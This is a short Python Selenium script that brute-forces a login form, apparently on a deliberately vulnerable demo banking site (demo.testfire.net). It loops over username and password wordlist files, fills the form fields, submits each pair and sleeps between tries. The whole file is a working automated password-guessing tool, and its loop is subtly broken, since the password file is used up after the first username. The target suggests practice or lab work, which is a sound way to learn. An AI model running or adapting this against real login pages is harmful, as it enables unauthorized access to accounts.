#import cool selenium stuff
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

#setup variables that can be changed in program?
userString = 'user'
passString= 'pass'

link = 'http://demo.testfire.net/login.jsp'

#setup browser
browser = webdriver.Chrome()
browser.get(link)

#open user and password files
passkeys= open("passwords.txt")

with open("usernames.txt") as users:
    for line in users:
        for line2 in passkeys:
            userString = line.rstrip()
            passString = line2.rstrip()
            # find HTML elements by their id and fill in corresponding values
            username = browser.find_element_by_id('uid')
            username.send_keys(userString)
            password = browser.find_element_by_id('passw')
            password.send_keys(passString)
            
            #find the sign in button and hit dat
            signInButton = browser.find_element_by_name('btnSubmit')
            signInButton.click()
            time.sleep(5)

#add
